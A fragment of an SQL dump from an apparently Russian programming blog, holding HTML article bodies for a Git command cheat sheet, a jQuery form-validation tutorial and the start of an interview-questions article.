&quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Отменяет все коммиты после заданного, оставляя все изменения в рабочей директории</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git reset --hard [коммит]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Сбрасывает всю историю вместе с состоянием рабочей директории до указанного коммита.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<h2 style="text-align:justify">СИНХРОНИЗАЦИЯ С УДАЛЕННЫМ РЕПОЗИТОРИЕМ</h2>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git fetch [удалённый репозиторий]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Скачивает всю историю из удалённого репозитория</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git merge [удалённый репозиторий]/[ветка]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Вносит изменения из ветки удалённого репозитория в текущую ветку локального репозитория</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git push [удалённый репозиторий] [ветка]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Загружает все изменения локальной ветки в удалённый репозиторий</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git pull</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Загружает историю из удалённого репозитория и объединяет её с локальной. pull = fetch + merge</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git status</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Перечисляет все новые или изменённые файлы, которые нуждаются в фиксации</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git diff</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Показывает различия по внесённым изменениям в ещё не проиндексированных файлах</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git add [файл]</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Индексирует указанный файл для последующего коммита</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git diff --staged</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Показывает различия между проиндексированной и последней зафиксированной версиями файлов</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git reset [файл]</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Отменяет индексацию указанного файла, при этом сохраняет его содержимое</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">$ git commit -m &quot;[сообщение с описанием]&quot;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 562.969px; width: 1px; height: 1px; overflow: hidden;">Фиксирует проиндексированные изменения и сохраняет их в историю версий</div>\r\n</div>\r\n\r\n<h2 style="text-align:justify">РАБОТА С GITHUB</h2>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">\r\n<blockquote>\r\n<div style="box-sizing: border-box;">git init</div>\r\n\r\n<div style="box-sizing: border-box;">git add README.md</div>\r\n\r\n<div style="box-sizing: border-box;">git commit -m &quot;first commit&quot;</div>\r\n\r\n<div style="box-sizing: border-box;">git branch -M main</div>\r\n\r\n<div style="box-sizing: border-box;">git remote add origin https://github.com/thesolarwind1991/test1.git</div>\r\n\r\n<div style="box-sizing: border-box;">git push -u origin main</div>\r\n</blockquote>\r\n</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n', '2022-09-14 14:02:42', '2022-09-16 14:38:29', 'Admin', '43a6642c8996d291a3e7.jpg', 0, 2),
	(22, 'ВАЛИДАЦИЯ ФОРМЫ СРЕДСТВАМИ JQUERY', 'В программировании нередко требуется валидация форм и проверка содержимого полей на корректность. Некоторые разработчики используют нотисы и оповещения об ошибке при неверном вводе данных в форму, другие же используют обрамления полей, которые были пусты или наполнены некорректными данными. В результате создания механизма валидации формируется вполне осмысленный программный код (скрипт) по проверке вводимых данных. ', '<p style="text-align:justify"><span style="font-size:18px">В программировании нередко требуется валидация форм и проверка содержимого полей на корректность. Некоторые разработчики используют нотисы и оповещения об ошибке при неверном вводе данных в форму, другие же используют обрамления полей, которые были пусты или наполнены некорректными данными. В результате создания механизма валидации формируется вполне осмысленный программный код (скрипт) по проверке вводимых данных.&nbsp;</span></p>\r\n\r\n<p style="text-align:justify"><span style="font-size:18px">Итак, допустим, что у нас есть форма с двумя полями, такими, как &quot;Фио пользователя&quot; и &quot;Email&quot;. Используя эту форму мы будем передавать данные на последующую обработку на стороне сервера. Обработка валидации формы формируется на стороне клиента через скрипт.&nbsp;</span></p>\r\n\r\n<p style="text-align:justify"><span style="font-size:18px">Часть HTML-кода выглядит следующим образом:</span></p>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n</blockquote>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;">\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&lt;style&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; .err {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; border: solid 2px red;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; }</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&lt;/style&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&lt;form id=&quot;form_goodpay&quot; name=&quot;form_goodpay&quot; class=&quot;form_style&quot; action=&quot;&quot; method=&quot;POST&quot;&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;label for=&quot;name_client&quot;&gt;ФИО клиента *:&lt;/label&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;input type=&quot;text&quot; id=&quot;name_client&quot; name=&quot;name_client&quot; value=&quot;&quot;/&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;label for=&quot;tel&quot;&gt;Телефон клиента:&lt;/label&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;input type=&quot;text&quot; id=&quot;tel&quot; name=&quot;tel&quot; value=&quot;&quot;/&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;label for=&quot;email&quot;&gt;Email клиента *:&lt;/label&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;input type=&quot;text&quot; id=&quot;email&quot; name=&quot;email&quot; value=&quot;&quot;/&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;input type=&quot;hidden&quot; id=&quot;key_hidden&quot; name=&quot;key_hidden&quot; value=&quot;key12345&quot;/&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lt;input type=&quot;submit&quot; id=&quot;submit1&quot; name=&quot;submit1&quot; value=&quot;Послать сообщение&quot;/&gt;&lt;br&gt;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&lt;/form&gt;</span></div>\r\n</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Скрипт обработки вводимых данных выглядит следующим образом:&nbsp;</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">\r\n<blockquote>\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp;$(document).ready(function() {&nbsp;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp;$(&quot;#form_goodpay&quot;).submit(function () {&nbsp;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;var Fio = $(&quot;#name_client&quot;); </span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;var Email = $(&#39;#email&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;var ReturnForm = true;&nbsp; &nbsp;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; if (Fio.val().length &lt; 4) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;console.log(&#39;Add class Err Fio&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Fio.addClass(&#39;err&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ReturnForm = false;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; } else {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log(&#39;Delete class Err Fio&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (Fio.hasClass(&#39;err&#39;)) Fio.removeClass(&#39;err&#39;); </span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;var reg = /^([a-z0-9_\\.-])+@[a-z0-9-]+\\.([a-z]{2,4}\\.)?[a-z]{2,4}$/i; </span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;if (reg.test(Email.val())) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log(&#39;Email correct!&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (Email.hasClass(&#39;err&#39;)) Email.removeClass(&#39;err&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;} else {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;console.log(&#39;Email uncorrect!&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Email.addClass(&#39;err&#39;);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ReturnForm = false;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp;return ReturnForm; // //валидация submit</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; });</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}); </span></div>\r\n</blockquote>\r\n</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;$(document).ready(function() {&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp; $(&quot;#form_goodpay&quot;).submit(function () {&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;var Fio = $(&quot;#name_client&quot;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;var Email = $(&#39;#email&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;var Text = $(&#39;#text&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;var ReturnForm = true;&nbsp; &nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;console.log(&#39;------ Click button sumbit! -------&#39;);&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (Fio.val().length &lt; 4) {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">console.log(&#39;Add class Err Fio&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">Fio.addClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">ReturnForm = false;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">} else {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp; &nbsp; console.log(&#39;Delete class Err Fio&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (Fio.hasClass(&#39;err&#39;)) Fio.removeClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;}</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">console.log(&#39;----------------------------------&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; console.log(&#39;----------------------------------&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp;console.log(&#39;----------------------------------&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;var reg = /^([a-z0-9_\\.-])+@[a-z0-9-]+\\.([a-z]{2,4}\\.)?[a-z]{2,4}$/i;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (reg.test(Email.val())) {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">console.log(&#39;Email correct!&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (Email.hasClass(&#39;err&#39;)) Email.removeClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">} else {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">console.log(&#39;Email uncorrect!&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">Email.addClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">ReturnForm = false;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">}</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (Text.val().length &lt; 1) {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">console.log(&#39;Add class Err Text&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">Text.addClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">ReturnForm = false;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">} else {</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp; &nbsp; console.log(&#39;Delete class Err Text&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">if (Text.hasClass(&#39;err&#39;)) Text.removeClass(&#39;err&#39;);</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;}</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; &nbsp;return ReturnForm; // //валидация submit</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp; });&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; position: absolute; left: -1000px; top: 424px; width: 1px; height: 1px; overflow: hidden;">&nbsp; &nbsp;});</div>\r\n</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Он подсвечивает ошибочные поля красным цветом. Это достигается за счет добавления класса .err к инпут-полям. Функция в случае возврата true передает данные на сервер, где они успешно дальше обрабатыватся. В случае возврата false обводятся красным ошибочные поля и отправка формы методом submit прерывается.</span></div>\r\n\r\n<p>&nbsp;</p>\r\n', '2022-09-14 14:05:37', '2022-09-21 13:15:16', 'Admin', '61f257f9d2f4f5f4447e.jpg', 0, 16),
	(23, 'СОБЕСЕДОВАНИЕ. СПИСОК ВОЗМОЖНЫХ ВОПРОСОВ.', 'Качественная подготовка — один из ключевых элементов, необходимых для успешного прохождения собеседования, которым, к слову, часто пренебрегают.\r\n\r\nНесмотря на то, что данная статья не претендует на объективность, она включает в себя все основные вопросы, которые могут быть заданы по теме PHP, JS, JQuery, CSS, HTML, MySQL и ООП, а также развернутые ответы на них.', '<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Качественная подготовка &mdash; один из ключевых элементов, необходимых для успешного прохождения собеседования, которым, к слову, часто пренебрегают.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Несмотря на то, что данная статья не претендует на объективность, она включает в себя все основные вопросы, которые могут быть заданы по теме PHP, JS, JQuery, CSS, HTML, MySQL и ООП, а также развернутые ответы на них.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Изучив эти темы, вы заметно улучшите свою теоретическую базу и значительно увеличите свои шансы на получение заветной работы.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">\r\n<h3><span 